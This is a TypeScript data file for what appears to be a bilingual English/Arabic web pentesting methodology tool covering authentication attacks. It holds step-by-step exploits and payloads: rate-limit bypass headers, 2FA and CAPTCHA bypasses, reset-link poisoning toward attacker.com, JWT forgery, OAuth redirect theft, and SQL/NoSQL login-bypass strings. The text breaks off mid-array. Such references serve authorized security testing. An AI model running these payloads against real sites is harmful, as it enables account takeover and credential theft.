export interface MethodologyItem {
  en: string;
  ar: string;
  exploit?: { en: string; ar: string };
  code?: string[];
}

export interface MethodologyStep {
  title: { en: string; ar: string };
  items: MethodologyItem[];
  payloads?: string[];
}

export interface MethodologyTopic {
  id: string;
  title: { en: string; ar: string };
  iconName: string;
  description: { en: string; ar: string };
  steps: MethodologyStep[];
}

export const defaultMethodology: MethodologyTopic[] = [
  {
    id: "auth",
    title: { en: "Auth & Login Gateways", ar: "بوابات الدخول والمصادقة" },
    iconName: "Shield",
    description: {
      en: "Complete methodology for testing Login, 2FA, Password Resets, and JWTs.",
      ar: "منهجية كاملة لاختبار تسجيل الدخول، المصادقة الثنائية، إعادة تعيين كلمة المرور، و JWT.",
    },
    steps: [
      {
        title: {
          en: "1. Username Enumeration (Recon)",
          ar: "1. تعداد ومعرفة المستخدمين (Username Enumeration)",
        },
        items: [
          {
            en: "Identify differences in HTTP Status Codes (e.g., 200 vs 403) for valid/invalid users.",
            ar: "ابحث عن اختلافات في رموز الحالة (Status Codes) للمستخدمين الصالحين وغير الصالحين.",
            exploit: {
              en: "Send login requests using Intruder. If an invalid user returns `404 Not Found` but a valid user returns `401 Unauthorized` or `403 Forbidden`, you can enumerate valid emails. This also applies to registration forms (e.g., 200 OK vs 409 Conflict).",
              ar: "أرسل قائمة بأسماء مستخدمين لمعرفة رد الحماية. إذا كان الإيميل غير مسجل قد يرد السيرفر بـ `404`، وإذا كان مسجلاً ولكن الرمز خطأ يرد بـ `401`. ينطبق نفس الشيء على نموذج التسجيل.",
            },
            code: [
              'POST /login HTTP/1.1\n\n{"email":"invalid@target.com"} --> 404',
              'POST /login HTTP/1.1\n\n{"email":"admin@target.com"} --> 401',
            ],
          },
          {
            en: "Analyze Response Time: Server might take longer to hash the password if username exists. Use a very long password to make the difference obvious.",
            ar: "تحليل زمن الاستجابة: قد يستغرق الخادم وقتاً أطول للتحقق إذا كان المستخدم موجوداً. استخدم كلمة مرور طويلة لتوضيح الفرق.",
            exploit: {
              en: "Send a massive password (70,000 characters). If the username exists, the server spends CPU time hashing it (taking seconds). If it doesn't exist, it instantly rejects it (milliseconds).",
              ar: "أرسل كلمة مرور ضخمة جداً (آلاف الحروف). إذا كان الحساب غير موجود سيرفضه الخادم فوراً (ميلي ثانية). أما إذا كان موجوداً، فسيقوم بتشفير الكلمة الطويلة مما سيستغرق ثوانٍ لمعالجتها.",
            },
            code: [
              'POST /login HTTP/1.1\n\n{"email":"admin@target.com", "password":"A...x70000"}\n// Time taken: 3000ms vs 50ms',
            ],
          },
          {
            en: 'Look for specific error messages (e.g., "Invalid password" vs "Invalid username or password").',
            ar: 'البحث عن اختلافات في رسائل الخطأ (مثال: "كلمة مرور خاطئة" بدلاً من "بيانات الدخول خاطئة").',
            exploit: {
              en: 'Login forms should always return generic errors. If it explicitly states "Email not found" or "Incorrect password", you can map out registered accounts.',
              ar: 'راقب رسالة الخطأ في واجهة الموقع أو الـ JSON. إذا كانت "الحساب غير موجود"، فهذا يُسهل عليك استخراج الحسابات الفعالة. (الصحيح أمنياً هو "بيانات الدخول خاطئة").',
            },
            code: [
              'HTTP/1.1 401 Unauthorized\n\n{"error": "User does not exist."}',
            ],
          },
          {
            en: "Use Burp Comparer to spot subtle byte-level differences in responses.",
            ar: "استخدم أداة Burp Comparer لملاحظة الفروقات الدقيقة جداً في حجم الاستجابة.",
            exploit: {
              en: "Even if error messages and status codes match perfectly, send the responses to Burp Comparer. A valid account might have a `Content-Length` difference of 2 bytes due to hidden logs or subtle HTML shifts.",
              ar: "حتى لو تطابقت رسائل الخطأ، أرسل نتيجة حساب موجود وآخر وهمي لأداة Comparer في Burp. قد تجد اختلافاً بسيطاً جداً في حجم الاستجابة يُميز الحساب الصحيح.",
            },
            code: [
              "Valid User: Content-Length: 1042",
              "Invalid User: Content-Length: 1040",
            ],
          },
        ],
        payloads: [
          "admin",
          "carlos",
          "root",
          "test",
          "guest",
          "administrator",
          "oracle",
          "mysql",
          "ftp",
          "azureuser",
          "vagrant",
        ],
      },
      {
        title: {
          en: "2. Rate Limit & Lockout Bypass",
          ar: "2. تخطي تقييد الطلبات (Rate Limit) والقفل",
        },
        items: [
          {
            en: "IP Rotation: Add headers like X-Forwarded-For, X-Real-IP, True-Client-IP and rotate them.",
            ar: "تغيير IP: إضافة هيدرات مثل X-Forwarded-For وتغيير قيمتها مع كل طلب لإيهام السيرفر بتعدد المصادر.",
            exploit: {
              en: "In Intruder, add HTTP headers predicting the user's real IP (like `X-Forwarded-For: 1.1.1.1`). Configure the payload to dynamically change the IP slightly for each password attempt, tricking the WAF into thinking the requests are coming from different devices. Other headers: `Client-IP`, `X-Originating-IP`.",
              ar: "باستخدام الـ Intruder، قم بوضع متغير على أرقام الآيبي داخل هيدر الـ `X-Forwarded-For`. اجعل الآيبي يتغير عشوائياً مع كل عملية تخمين ليظن السيرفر أن الطلبات تأتي من أشخاص مختلفين حول العالم ويتخطى حظر الـ Rate limit. وجرب الهيدرات المشابهة.",
            },
            code: [
              'POST /login HTTP/1.1\nX-Forwarded-For: 192.168.1.1\nX-Client-IP: 192.168.1.1\n\n{"username": "admin", "password": "FUZZ"}',
            ],
          },
          {
            en: "Pitchfork Attack: Input your own valid credentials every few requests to reset the failure counter (Valid -> Victim -> Valid).",
            ar: "هجوم متناوب (Pitchfork): استخدم حسابك الصالح بين المحاولات الفاشلة لتصفير عداد المنع (صحيح -> ضحية -> صحيح).",
            exploit: {
              en: "If the app locks IP after 5 bad attempts, configure Burp Intruder to alternate between 4 bad guesses for the victim, and 1 successful login for YOUR account. The successful login often resets the WAF failure counter to zero.",
              ar: "إذا كان الموقع يمنعك بعد 5 محاولات فاشلة. قم بضبط أداة التخمين على إرسال 4 محاولات خاطئة لحساب الضحية، والطلب الخامس يكون لتسجيل الدخول بحسابك (بشكل ناجح). هذا النجاح سيُصفر عداد البلوك في السيرفر.",
            },
            code: [
              "Request 1-4: Invalid victim login",
              "Request 5: Valid attacker login (resets limit)",
            ],
          },
          {
            en: "Null Byte/Bomb Attack: Re-send valid username heavily until the account locks to confirm its existence.",
            ar: "هجوم القفل: تكرار الطلبات لاسم مستخدم حتى يتم قفل الحساب، مما يؤكد وجوده.",
            exploit: {
              en: 'If the application locks an account after exactly 5 invalid attempts, spam a target email 100 times. Then make 1 manual request. If it says "Account locked", it proves the email exists in their system.',
              ar: 'إذا كان النظام يقفل الحساب بعد المحاولات الخاطئة. قم بعمل تخمين ضخم 100 مرة لاسم ضحية. إذا تغيرت الاستجابة لتصبح "الحساب مقفل" فهذا يؤكد أن الإيميل مسجل.',
            },
            code: [
              'HTTP/1.1 401 Unauthorized\n\n{"error": "Account temporarily locked."}',
            ],
          },
          {
            en: "Use Resource Pool (1 concurrent request) in Burp to avoid race condition blocks during bypass.",
            ar: "استخدم Resource Pool بطلب واحد متزامن (1 thread) لتجنب التداخل أثناء تخطي الحماية.",
            exploit: {
              en: "Rate limiting bypasses often require strict pacing. WAFs easily detect parallel requests. Use Burp's Resource Pool to limit Intruder to exactly 1 concurrent request with a 1-second delay.",
              ar: "جدران الحماية تكشف التخمين عبر السرعة. استخدم (Resource Pool) في قائمة بورب واجعله (1 Thread) ليقوم بتجربة بطيئة كالتي يفعلها الإنسان ليخدع الـ Firewall.",
            },
            code: [
              "// Burp Suite -> Intruder -> Resource Pool -> Count: 1, Delay: 1000ms",
            ],
          },
        ],
        payloads: [
          "X-Forwarded-For: 127.0.0.1",
          "X-Originating-IP: 127.0.0.1",
          "X-Real-IP: 127.0.0.1",
        ],
      },
      {
        title: {
          en: "3. Two-Factor Authentication (2FA) / OTP",
          ar: "3. تخطي المصادقة الثنائية (2FA/OTP)",
        },
        items: [
          {
            en: "Direct Bypass: Force browse directly to /dashboard or /profile after step 1 without providing OTP.",
            ar: "التخطي المباشر: الدخول المباشر لصفحة /dashboard بعد الخطوة الأولى من تسجيل الدخول دون إدخال الرمز.",
            exploit: {
              en: "After entering the email and password, the server asks for the SMS code. Instead of entering it, change the URL in your browser directly to `/profile` or `/admin`. If the session was fully granted on step 1, you bypass OTP.",
              ar: "بعد تسجيل الإيميل وكلمة السر، تأتي خطوة إدخال الرمز (OTP). لا تدخل الرمز وبدلاً من ذلك اكتب في المتصفح الرابط المباشر للمنصة (مثل `/dashboard`). في المواقع الضعيفة، الجلسة تُمنح من الخطوة الأولى وتتخطى التحقق.",
            },
            code: ["GET /dashboard HTTP/1.1\nCookie: session=granted_at_step1"],
          },
          {
            en: "Flawed Logic (Cookie Manipulation): Login with your account, modify the cookie/parameter at OTP step to account=victim, request may process for victim.",
            ar: "تغيير الكوكي/المعلمات: في خطوة OTP، قم بتغيير القيمة لتشير للضحية (مثلاً account=victim).",
            exploit: {
              en: 'When supplying the correct OTP for your OWN account, intercept the POST request. If there\'s a parameter like `{"user_id": 12, "otp": 1234}`, change the ID to the victim\'s. The server verifies the OTP mathematically but logs you into the provided ID.',
              ar: "عند إرسال الرمز الصحيح الخاص بحسابك أنت، قم باعتراض الطلب وتغيير الـ `user_id` المرسل ليصبح رقم حساب الضحية.",
            },
            code: [
              'POST /api/2fa/verify HTTP/1.1\n\n{"user_id": "victim_id", "otp": "MY_VALID_OTP"}',
            ],
          },
          {
            en: "No Rate Limit: Brute-force the 4-digit or 6-digit OTP if there is no rate limiting.",
            ar: "تخمين الرمز (Bruteforce): إذا لم يكن هناك Rate Limit، قم بتجربة جميع الاحتمالات للرمز (مثلاً 0000 إلى 9999).",
            exploit: {
              en: "Send the verification request to Burp Intruder. Set the payload to numbers `0000` through `9999`. If the server doesn't block you after 5 attempts, you will eventually find the right code.",
              ar: "استخدم أداة Intruder في Burp. قم بتظليل الرمز وأرسل حمولة أرقام من `0000` إلى `9999`. في حال غياب الحماية (Rate limit) سينجح كود واحد بالاختراق.",
            },
            code: ['{"otp": "0000"} --> {"otp": "0001"} --> ...'],
          },
          {
            en: 'Response Manipulation: Intercept the failing OTP response and change {"success":false} to {"success":true}.',
            ar: 'تغيير الاستجابة (Response Manipulation): اعترض استجابة الخادم عند فشل الرمز وحول {"success":false} إلى {"success":true}.',
            exploit: {
              en: 'Enter a wrong OTP (`1111`). Set Burp to "Do Intercept -> Response to this request". When the server says `{"success": false}`, rewrite it manually to `{"success": true}`. The frontend Javascript might trust it and log you in.',
              ar: 'أدخل كود 2FA خاطئ. اعترض "استجابة" السيرفر للطلب. غيّر قيمة الفشل بكلمة `true`. المتصفح سيعتقد أن رمزك صحيح وقد يدخلك للإعدادات.',
            },
            code: ['HTTP/1.1 200 OK\n\n{"success": true}'],
          },
        ],
      },
      {
        title: {
          en: "4. Remember Me & Cookie Analysis",
          ar: "4. تحليل الكوكيز (Remember Me)",
        },
        items: [
          {
            en: "Decode Base64, URL encoding, or Hex to find predictable structures (e.g., base64(username:md5(password))).",
            ar: "فك تشفير الكوكي (غالباً Base64) للبحث عن بنية متوقعة مثل username:md5(password).",
            exploit: {
              en: "Inspect the `remember_me` or `auth` cookie. Decode it using Burp Decoder. If it looks like `admin:16334522`, you can forge yours: `victim:16335000`.",
              ar: "انسخ كوكي الـ `remember_me` وفك تشفيره (غالباً Base64). إذا وجدت أنه ببساطة `username:id` يمكنك التعديل عليه ليكون `admin:1` وتشفيره مجدداً لتخترق حساب المدير.",
            },
            code: [
              "Cookie: remember_me=YWRtaW46MTY1NjUwMDAwMA==\n// Decodes to: admin:1656500000",
            ],
          },
          {
            en: "Burp Payload Processing: Hash the password (MD5), add a prefix (username:), then Base64 encode the whole string to spoof a valid cookie.",
            ar: "استخدام Payload Processing في Burp: تطبيق التشفير المطلوب خطوة بخطوة لمحاكاة كوكي صالح وتجاوز تسجيل الدخول.",
            exploit: {
              en: "In Intruder, set Payload Processing rules: 1. Hash with MD5, 2. Add prefix `admin:`, 3. Encode as Base64. This perfectly simulates the weak backend cookie logic.",
              ar: "في قسم Intruder، استعمل الفلاتر لبرمجة التشفير: شفر الباسوورد بـ MD5، أضف كلمة `admin:` قبلها، ثم شفر الكل بـ Base64 لتقوم بتجربة التخمين بناءً على هندسة الكوكي المكتشفة.",
            },
            code: [
              'Payload -> Hash(MD5) -> Add Prefix("admin:") -> Encode(Base64)',
            ],
          },
          {
            en: "Session Puzzling/Fixation: Use a session ID obtained prior to authentication to see if it remains valid after.",
            ar: "تثبيت الجلسة (Session Fixation): تحقق مما إذا كان معرف الجلسة يتغير بعد تسجيل الدخول أم يظل ثابتاً.",
            exploit: {
              en: "Note your `PHPSESSID` before logging in. Log in. If the ID doesn't change, the app is vulnerable to session fixation.",
              ar: "راقب معرف جلستك قبل تسجيل الدخول. سجل الدخول وراقب. إذا لم يقم الخادم بتغيير رقم هويتك ومنحك واحداً جديداً محمياً، فالتطبيق مصاب بثغرة تثبيت الجلسة.",
            },
            code: [
              "Set-Cookie: PHPSESSID=guest_123;\n// After login => PHPSESSID=guest_123; (Vulnerable!)",
            ],
          },
        ],
      },
      {
        title: {
          en: "5. Password Reset Vulnerabilities",
          ar: "5. ثغرات إعادة تعيين كلمة المرور",
        },
        items: [
          {
            en: "Host Header Injection: Inject X-Forwarded-Host: attacker.com to poison the password reset link.",
            ar: "حقن الهيدر (Host Header Injection): إضافة X-Forwarded-Host: attacker.com لتسميم رابط إعادة التعيين.",
            exploit: {
              en: 'Intercept the "Forgot Password" request. Add `X-Forwarded-Host: your-server.com`. The resulting email sent to the victim will contain a reset link pointing to YOUR server instead of the actual domain.',
              ar: 'اعترض طلب "نسيت كلمة المرور". أضف هيدر `X-Forwarded-Host: attacker.com`. سيقوم الخادم ببناء رابط الاستعادة بناءً على موقعك، وسيرسله للضحية. عندما تضغط الضحية عليه، سيصلك كود الاستعادة السري!',
            },
            code: [
              'POST /api/v1/password/reset HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com\n\n{"email":"victim@target.com"}',
            ],
          },
          {
            en: "Parameter Pollution (HPP): email=victim@site.com&email=attacker@site.com (Token sent to both or attacker).",
            ar: "تلوث المعلمات: إرسال email=victim&email=attacker لخداع الخادم لإرسال رابط التعيين لكلا الإيميلين.",
            exploit: {
              en: "Duplicate the email parameter in the request. The backend might generate the reset token for the FIRST email but email it to the SECOND email.",
              ar: "كرر معلمة البريد في الطلب. قد يقوم الخادم بإنشاء رمز استعادة لحساب الـ victim، ولكنه سيرسل الإيميل الذي يحتوي الرمز لبريدك أنت!",
            },
            code: [
              'POST /api/reset HTTP/1.1\n\n{"email": "victim@target.com", "email": "attacker@target.com"}',
            ],
          },
          {
            en: "Token Predictability: Check if reset token is just an MD5 of the email, timestamp, or a predictable sequence.",
            ar: "توقع التوكن (Predictability): تحقق مما إذا كان رمز الاستعادة هو مجرد تشفير (MD5) للإيميل أو لطابع زمني.",
            exploit: {
              en: "Request 3 reset tokens for your own account in a row. Analyze them. Are they just sequential numbers? Are they Base64 of the current Unix time? If so, you can predict the victim's token.",
              ar: "اطلب إعادة تعيين كلمة المرور لحسابك 3 مرات. حلل الأكواد. هل هو مجرد تشفير `MD5` للإيميل؟ أم أنه مجرد وقت الخادم بالثواني المكتوب بصيغة Base64؟ إذا اكتشفت خوارزمية التوكن، ستتمكن من صناعة توكن الضحية محلياً.",
            },
            code: [
              "Token 1: 1714560001\nToken 2: 1714560002\nToken 3: 1714560003",
            ],
          },
          {
            en: "Token Leakage: Check Referer headers, or responses if the token leaks back to the client side.",
            ar: "تسريب التوكن: تحقق من تسريب رمز الاستعادة في الاستجابات أو في هيدر Referer.",
            exploit: {
              en: 'When requesting a reset for the victim, look carefully at the HTTP response. Sometimes the API is poorly coded and returns `{"success": true, "reset_token": "12345"}` right there instead of solely emailing it.',
              ar: "عند طلب باسورد للضحية، تأمل استجابة الخادم جيداً. في بعض الواجهات البرمجية الضعيفة (API)، قد يطبع الخادم رمز الاستعادة في الاستجابة (Response) عن طريق الخطأ بدلاً من إرساله للإيميل حصراً.",
            },
            code: [
              'HTTP/1.1 200 OK\n\n{"msg": "Email sent!", "token": "a1b2c3d4..."}',
            ],
          },
        ],
      },
      {
        title: { en: "6. JWT (JSON Web Tokens) Attacks", ar: "6. هجمات (JWT)" },
        items: [
          {
            en: 'None Algorithm: Change alg to "none", remove signature, modify payload to {"user":"admin"}.',
            ar: "ألغوريثم None: قم بتغيير الخوارزمية إلى none، احذف التوقيع، وعدّل البيانات لتصبح تخص المدير.",
            exploit: {
              en: 'Decode the JWT header. Change `"alg": "HS256"` to `"alg": "none"`. Change the payload body (e.g. `role: admin`). Strip everything after the second dot (the signature) but keep the dot.',
              ar: "شروط هذه الثغرة: عدل رأس التوكن عبر جعل الخوارزمية `none`. ثم عدل الصلاحيات في قسم البيانات (Payload) ليصبح `admin`. ثم احذف التوقيع في النهاية ولكن أبقِ النقطة الأخيرة.",
            },
            code: [
              "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            ],
          },
          {
            en: "Weak Secret Brute-force: Use Hashcat to crack HS256 tokens using a wordlist.",
            ar: "تخمين المفتاح السري (Weak Secret): استخدم Hashcat لمحاولة معرفة النص السري (Secret Key) لتوقيع JWT.",
            exploit: {
              en: "If the token uses symmetric encryption (HS256), the backend uses a single secret string to sign it. Run offline cracking tools like hashcat against the token. If cracked, you can sign your own admin tokens.",
              ar: "إذا كان التوكن يستخدم تشفيراً متماثلاً `HS256`، فقد يكون المبرمج استخدم كلمة سر بسيطة (مثل `secret123`). استخدم برنامج `Hashcat` لاختراق التشفير بمعجم كلمات.",
            },
            code: ["hashcat -a 0 -m 16500 jwt.txt rockyou.txt"],
          },
          {
            en: "Algorithm Confusion (RS256 to HS256): Take public key, convert it to secret key format for HS256, forge token.",
            ar: "تضليل الخوارزمية (RS256 إلى HS256): استخدام المفتاح العام المتوفر لتوقيع التوكن بخوارزمية HS256.",
            exploit: {
              en: "If the backend expects a public/private keypair (RS256) but fails to enforce the algorithm type, change the header to `HS256` and sign your forged token using the leaked *public* key as the symmetric secret.",
              ar: "إذا وجد المفتاح العام (Public Key) بالموقع، قم بتغيير خوارزمية التوكن من `RS` إلى `HS`. وبدلاً من الخادم، قم بتوقيعه بنفسك عبر استخدام المفتاح العام كأنه مفتاح سرّي.",
            },
            code: [
              '{"alg": "HS256", "typ": "JWT"}\n// Sign token using public.pem string as secret',
            ],
          },
          {
            en: "Information Disclosure: Read the decoded JWT payload—it may contain sensitive user roles or PII.",
            ar: "تسريب البيانات: فك تشفير البيانات داخل JWT للبحث عن صلاحيات أو بيانات حساسة مخفية.",
            exploit: {
              en: "A JWT is merely Base64 encoding, not encryption. Decode it on jwt.io. It often leaks internal system paths, email addresses, or unencrypted user IDs.",
              ar: "التوكن عبارة عن تشفير Base64 وليس تشفير أمني معقد. قم بفكه في موقع `jwt.io` لتجد داخله معلومات مخفية كإيميلك وتفاصيل صلاحياتك.",
            },
            code: [
              '{"user_id": 12, "email": "admin@target.com", "role": "SuperAdmin", "path": "/var/www/internal"}',
            ],
          },
        ],
      },
      {
        title: {
          en: "7. OAuth & SSO Misconfigurations",
          ar: "7. ثغرات OAuth وتسجيل الدخول الموحد (SSO)",
        },
        items: [
          {
            en: "Open Redirect in redirect_uri: Modify redirect_uri to steal authorization codes or tokens via referrer leakage.",
            ar: "تحويل المسار المفتوح (Open Redirect): تغيير parameter الـ redirect_uri لسرقة كود التفويض (Auth Code) أو التوكن عبر تسريب الـ Referrer.",
            exploit: {
              en: "Intercept the OAuth consent link. Change `redirect_uri=https://target.com/callback` to your `attacker.com`. If accepted, the victim logs in, and the provider sends their secret code to your server.",
              ar: "اعترض رابط المصادقة، غيّر رابط الرد (redirect_uri) إلى خادمك. إذا لم تكن هناك حماية، سيرسل لك مزود الخدمة (مثل جوجل) كود دخول الضحية.",
            },
            code: [
              "https://oauth-provider.com/auth?client_id=123&redirect_uri=https://attacker.com",
            ],
          },
          {
            en: "CSRF in Integration: Check if the \"state\" parameter is missing or predictable. Allows linking an attacker's social account to a victim's session.",
            ar: 'ثغرة CSRF: تحقق من غياب أو إمكانية توقع الـ "state" parameter، مما يسمح بربط حساب التواصل الاجتماعي للمهاجم بحساب الضحية.',
            exploit: {
              en: 'In a "Link your Facebook account" feature, generate the linking link but drop the request. Send this CSRF link to the victim. If they click it, YOUR Facebook connects to THEIR target account.',
              ar: 'عند النقر على "اربط حسابك"، قم باعتراض الطلب وإرسال الرابط للضحية. إذا لم يكن هناك معلمة `state`، سيرتبط حسابك أنت بملف الضحية.',
            },
            code: ["https://target.com/oauth/callback?code=ATTACKER_CODE"],
          },
          {
            en: "Pre-Account Takeover (Pre-ATO): Register a classic account with victim's email. When victim later uses Google/Apple SSO, they might be logged into the attacker-controlled account.",
            ar: "السيطرة المسبقة (Pre-ATO): أنشئ حساباً كلاسيكياً بإيميل الضحية. عند استخدام الضحية لاحقاً تسجيل الدخول بـ Google/Apple، قد يتم الخلط وربطهم بالحساب الذي يسيطر عليه المهاجم.",
            exploit: {
              en: 'Register a regular account on the target using `victim@email.com` and a password you control. Leave it unverified. When the victim clicks "Log in with Google", the backend merges them. You can now log in with your password to view their data.',
              ar: 'سجل بالموقع بالبريد القديم لضحيّة بكلمة سر من اختيارك. عندما يأتي الضحية للتسجيل عبر "الدخول بجوجل"، سيدمج الموقع الحسابين، وتصبح تملك وصولاً كاملاً لحسابه.',
            },
            code: [
              'POST /register HTTP/1.1\n\n{"email": "victim@target.com", "password": "AttaCkerPassword!"}',
            ],
          },
          {
            en: "Token Substitution: Swap user profile details in the callback data if the backend implicitly trusts client-provided OAuth data.",
            ar: "تبديل التوكن: تلاعب ببيانات الملف الشخصي المعادة في الكول باك (Callback) إذا كان الخادم يثق ببيانات العميل بشكل أعمى.",
            exploit: {
              en: "Intercept the callback request returning from the OAuth provider to the target server. If the payload contains an email field, modify it to the victim's email.",
              ar: "بعد مصادقة جوجل الخاصة بك، وقبل وصول البيانات للخادم الهدف، اعترضها وغيّر الإيميل العائد من جوجل إلى إيميل الضحية لسرقة حسابه.",
            },
            code: [
              'POST /api/auth/google/callback HTTP/1.1\n\n{"email": "victim@target.com", "id": "12345"}',
            ],
          },
        ],
      },
      {
        title: {
          en: "8. Registration & Account Takeover (ATO) Flaws",
          ar: "8. ثغرات التسجيل والسيطرة على الحسابات (ATO)",
        },
        items: [
          {
            en: "Unicode Normalization / Whitespace: Register as `admin @site.com` or `admin%00@site.com`. Backend normalization might overwrite or collide with the real admin.",
            ar: "تسوية النصوص (Normalization): سجل حساباً باسم `admin @site.com` أو `admin%00@site.com`. قد يقوم الخادم بدمج البيانات ليحل محل حساب الـ Admin الأصلي.",
            exploit: {
              en: "Create a new account but add a space or hidden Unicode character to the target email (e.g. `victim@email.com `). Truncation or uppercase normalizations might merge your new account with their existing one, granting you access.",
              ar: "حاول إنشاء حساب جديد بنفس إيميل الضحية ولكن أضف مسافة فارغة في نهايته. أحياناً يقوم الموقع بمسح المسافة بعد التسجيل ويدمج حسابك الجديد بحساب الضحية.",
            },
            code: [
              'POST /register HTTP/1.1\n\n{"email": "victim@target.com "}',
            ],
          },
          {
            en: "Email Verification Bypass: Try to change email in profile to a victim's email without verifying it, then reset the password using the new email.",
            ar: "تخطي تحقق الإيميل: قم بتغيير إيميلك في الحساب إلى إيميل الضحية دون الضغط على رابط التأكيد، ثم جرب طلب إعادة تعيين كلمة المرور.",
            exploit: {
              en: 'In your account profile, change your email to the `victim@target.com` but do NOT click the generated confirmation link. Log out, go to "Forgot Password", and ask to reset `victim@target.com`. The password reset link might be sent to your old verified email or bypass restrictions completely.',
              ar: 'قم بتغيير إيميلك في الإعدادات إلى إيميل الضحية. لا تقم بتأكيده. اخرج من الحساب واستخدم ميزة "نسيت كلمة المرور". قد يرسل الموقع رابط الاستعادة لإيميلك أنت بدلاً من الضحية.',
            },
            code: [
              'POST /profile/update HTTP/1.1\n\n{"email": "victim@target.com"}',
              "// DO NOT verify. Then logout and reset password.",
            ],
          },
          {
            en: "Response Manipulation during Registration: Intercept a failed confirmation response and change status to true or 200.",
            ar: "التلاعب بالاستجابة أثناء التسجيل: اعترض الاستجابة التي تفيد بفشل تفعيل الحساب وحولها إلى true أو 200 OK لتفعيل حساب غير موثق.",
            exploit: {
              en: 'When required to enter an SMS OTP during registration, enter an invalid one. Intercept the server\'s HTTP response (`{"verified": false}`) and change it to `{"verified": true}` before the browser receives it.',
              ar: 'أدخل كود تحقق SMS خاطئ. وقبل أن يصل الرد للمتصفح، قم بتغيير رسالة الخادم من فشل العملية (`{"success":false}`) إلى نجاح (`{"success":true}`) لتخطي واجهة التحقق.',
            },
            code: ['HTTP/1.1 200 OK\n\n{"verified": true}'],
          },
        ],
      },
      {
        title: {
          en: "9. Auth SQLi & NoSQLi",
          ar: "9. حقن قواعد البيانات في المصادقة (SQLi & NoSQLi)",
        },
        items: [
          {
            en: "Classic SQLi: Use traditional bypasses in user/password fields if input is unsanitized.",
            ar: "حقن SQL الكلاسيكي: استخدام البايلودات التقليدية لتخطي تسجيل الدخول في حال غياب الفلترة.",
            exploit: {
              en:
                "In a login form, supply `" +
                "`' OR '1'='1` as the username. If the query is constructed as `SELECT * FROM users WHERE username='' OR '1'='1' AND password=''`, the condition is universally true, logging you in as the first user (usually Admin).",
              ar: "اكتب في خانة اسم المستخدم `' OR '1'='1` واترك الرمز فارغاً. هذا سيجعل الشرط البرمجي (صحيح دائماً) ويدخلك كأول حساب في قاعدة البيانات (وغالباً هو المدير).",
            },
            code: ["admin' OR '1'='1'--", 'admin" or "1"="1"/*\\'],
          },
          {
            en: 'NoSQLi in JSON Logins: Intercept JSON POST req and change {"password":"123"} to {"password":{"$ne": "123"}} or {"$gt": ""}.',
            ar: 'حقن NoSQL في تسجيل JSON: عند إرسال البيانات بصيغة JSON، استبدل كلمة المرور بكائن استعلام مثل {"$ne": "123"} (لا يساوي 123) لتخطي الفحص.',
            exploit: {
              en: 'For MongoDB/NoSQL backends, they do not suffer from standard text-based SQLi. Instead, inject JSON operators. Changing a string payload to an object wrapper `{"$ne": "invalid"}` forces the database to evaluate "Does the password Not-Equal \'invalid\'?", which is true.',
              ar: 'في قواعد بيانات NoSQL (مثل MongoDB)، لا تستخدم أكواد النصوص. بدلاً من ذلك، في رسالة الـ JSON غيّر خانة الرقم السري وضع بدلاً منها عملية حسابية كـ `{"$gt": ""}` (أكبر من مسافة فارغة). سيعتبرها الخادم صحيحة.',
            },
            code: [
              '{"username": "admin", "password": {"$ne": "wrongpassword"}}',
            ],
          },
          {
            en: 'Type Juggling in PHP: If using loose comparison (==), sending {"password": true} or integer might bypass hash checks.',
            ar: "تلاعب الأنواع (Type Juggling): في أنظمة PHP التي تستخدم المقارنة الضعيفة (==)، إرسال قيم منطقية (true) أو رقمية قد يتخطى التحقق من القيمة.",
            exploit: {
              en: 'If the backend uses PHP and compares input loosely (`if($pwd == $hash)`), changing the JSON password type from a String `"true"` to a Boolean `true` might evaluate as equals without matching the exact string.',
              ar: "إذا كان الموقع يستخدم PHP ويقارن المتغيرات بـ `==` بدلاً من `===`، أرسل المتغير `true` الحقيقي (بدون علامات تنصيص) في ملف الـ JSON ليتخطى فحص الهاش المعقد.",
            },
            code: ['{"username": "admin", "password": true}'],
          },
        ],
        payloads: [
          "admin' OR '1'='1'--",
          '{"email": "admin@target.com", "password": {"$ne": "invalid"}}',
          '{"email": {"$gt":""}, "password": {"$gt":""}}',
          'admin" or "1"="1"/*\\',
        ],
      },
      {
        title: {
          en: "10. CAPTCHA & Anti-Bot Bypass",
          ar: "10. تخطي الكابتشا (CAPTCHA) وحمايات البوتات",
        },
        items: [
          {
            en: 'Parameter Deletion: Completely remove the "g-recaptcha-response" parameter from the request and see if it processes.',
            ar: "حذف المعلمة (Parameter): قم بحذف معلمة الكابتشا من الطلب تماماً وتحقق مما إذا كان الخادم يتجاهل الفحص.",
            exploit: {
              en: "Intercept a valid form submission. Delete everything related to CAPTCHA in the JSON or form body (like `g-recaptcha-response`). Sometimes the backend logic is `if (param_exists) { validate(); }` instead of making it strictly required.",
              ar: "اعترض الطلب أثناء التسجيل. امسح متغير الكابتشا (مثل `g-recaptcha-response`) بالكامل من النص. إذا كان المبرمج يتحقق من الكابتشا فقط في حال كانت موجودة، سيتم تجاوزها.",
            },
            code: [
              'POST /login HTTP/1.1\n\n{"username":"admin", "password":"123"} // Captcha parameter completely removed',
            ],
          },
          {
            en: "Empty Parameter: Send the captcha parameter but leave its value empty.",
            ar: "معلمة فارغة: أرسل المعلمة الخاصة بالكابتشا ولكن بقيمة فارغة (Empty String).",
            exploit: {
              en: 'Instead of removing the key, send it as an empty string (e.g. `"g-recaptcha-response": ""` or `"captcha": null`). Weak logical checks might evaluate empty as valid.',
              ar: 'لا تحذف المتغير، بل أرسله بقيمة فارغة `captcha=""`. بعض الأنظمة ذات المنطق الضعيف تتعامل مع الفراغ على أنه تحقق صحيح.',
            },
            code: [
              'POST /login HTTP/1.1\n\n{"username":"admin", "password":"123", "g-recaptcha-response": ""}',
            ],
          },
          {
            en: "Token Reuse: Solve the captcha once, intercept the valid token, and reuse it for multiple brute-force requests.",
            ar: "إعادة استخدام التوكن: حل الكابتشا مرة واحدة، انسخ التوكن الصالح، واستخدمه في طلبات متكررة أو هجوم بروت فورس.",
            exploit: {
              en: "Pass the CAPTCHA once properly. Copy the long generated token from interception. Re-use that identical token in Burp Intruder for hundreds of subsequent password guesses. Weak integrations don't invalidate the token after one use.",
              ar: "حل الكابتشا بيديك مرة واحدة. وقت الإرسال انسخ التوكن الصالح. ضعه في بورب وأعد استخدامه لآلاف الطلبات؛ إذا كان النظام لا يحرق التوكن بعد الاستعمال، فقد كسرت قيوده.",
            },
            code: [
              '{"username":"admin", "password":"FUZZ", "g-recaptcha-response":"03AGdBq...REUSED_TOKEN"}',
            ],
          },
          {
